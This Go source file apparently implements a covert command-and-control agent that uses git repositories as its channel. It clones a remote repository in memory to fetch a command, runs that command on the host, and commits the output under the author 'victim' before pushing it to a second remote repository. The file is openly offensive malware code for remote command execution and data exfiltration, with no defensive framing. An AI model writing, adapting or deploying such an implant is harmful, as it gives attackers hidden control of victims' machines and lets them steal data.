package main

import (
	"bytes"
	"io/ioutil"
	"os/exec"
	"strings"
	"time"

	"gopkg.in/src-d/go-git.v4"
	"gopkg.in/src-d/go-git.v4/storage/memory"
	"gopkg.in/src-d/go-git.v4/plumbing/object"

	"gopkg.in/src-d/go-billy.v4/memfs"
	"gopkg.in/src-d/go-billy.v4/util"
)


// Function for loading command from the Command Repo
func loadCommand(repoURL string) (string, error) {

	// Cloning the Command Repo in-memory
	fs := memfs.New()
	_, err := git.Clone(memory.NewStorage(), fs, &git.CloneOptions{
		URL:      repoURL,
	})
	if (err != nil) {
		return "", err
	}

	// Get fileHandler
	fileHandler, err := fs.Open("command")
	if (err != nil) {
		return "", err
	}

	// Get fileContent from fileHandler
	fileContent, err := ioutil.ReadAll(fileHandler)
	if (err != nil) {
		return "", err
	}

	// Cleaning the Command string
	command := string(fileContent)
	command = strings.TrimSuffix(command, "\n")

	return command, nil
}


// Function for running the command and push it to the Output Repo
func runCommand(command string, repoURL string) error {

	// Split command into Array of strings
	cmdArgs := strings.Fields(command)

	// Running the command
	cmd := exec.Command(cmdArgs[0], cmdArgs[1:]...)

	var out bytes.Buffer
    cmd.Stdout = &out
	err := cmd.Run()
    if err != nil {
        return err
    }

	// Cloning the Output Repo in-memory
	fs := memfs.New()
	repo, err := git.Clone(memory.NewStorage(), fs, &git.CloneOptions{
		URL:      repoURL,
	})
	if (err != nil) {
		return err
	}

	// Storing the command output in "out" file in the repository
	fileContent := []byte(out.String())
	err = util.WriteFile(fs, "out", fileContent, 0644)
	if err != nil {
		return err
	}

	// Commit the out file in the memory
	worktree, err := repo.Worktree()
	worktree.Add("out")
	_, err = worktree.Commit("new output", &git.CommitOptions{
        Author: &object.Signature{
            Name:  "victim",
            Email: "victim@localhost",
            When:  time.Now(),
        },
    })
	if (err != nil) {
		return err
	}

	// Pushing to the output repository
	err = repo.Push(&git.PushOptions{
    })
	if (err != nil) {
		return err
	}

	return nil
}